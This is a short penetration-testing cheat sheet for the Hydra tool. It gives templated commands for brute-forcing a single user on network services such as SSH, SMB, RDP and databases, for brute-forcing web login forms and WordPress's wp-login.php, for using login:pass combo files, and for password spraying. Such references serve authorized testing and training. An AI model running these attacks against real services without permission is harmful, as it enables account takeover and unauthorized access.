# Hydra

% hydra, bruteforce

## Bruteforce a user access
#assessment/All #attack_type/Bruteforce #access/Anonymous

Bruteforce access to an exposed service for a specific user.
Common protocols :
    - ftp           - mssql
    - ssh           - mysql
    - telnet        - postgres
    - smtp          - mongodb
    - snmp          - rdp
    - smb           - vnc   
    
```bash
hydra -l <user> -P <wordlist> <ip> <protocol> 
```

## Bruteforce Web form
#assessment/Web #attack_type/Bruteforce #access/Anonymous

Bruteforce access to an exposed web login interface.
    
```bash
hydra -l <user> -P <wordlist> <ip> http-post-form "/<endpoint>:username=^USER^&password=^PASS^:F=<error_wording>" -V
```

## Bruteforce WordPress
#assessment/Web #attack_type/Bruteforce #access/Anonymous

Bruteforce access to an exposed WordPress login interface.
    
```bash
hydra -l <user> -P <wordlist> MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=<wp-submit>:F=incorrect" -V
```

## Bruteforce with file "login:pass" format
#assessment/All #attack_type/Bruteforce #access/Anonymous

Bruteforce access to an exposed service using a file with "login:pass" format.
Common protocols :
    - ftp           - mssql
    - ssh           - mysql
    - telnet        - postgres
    - smtp          - mongodb
    - snmp          - rdp
    - smb           - vnc
    
```bash
hydra -t 4 -s <port> -C <file_login_pass> <ip> <protocol> 
```

## Password spray (user=password)
#assessment/All #attack_type/Bruteforce #access/Anonymous

Password spray access to an exposed service with user=password.
Common protocols :
    - ftp           - mssql
    - ssh           - mysql
    - telnet        - postgres
    - smtp          - mongodb
    - snmp          - rdp
    - smb           - vnc  

```bash
hydra -L <users.list> -e s <ip> <protocol>  
```
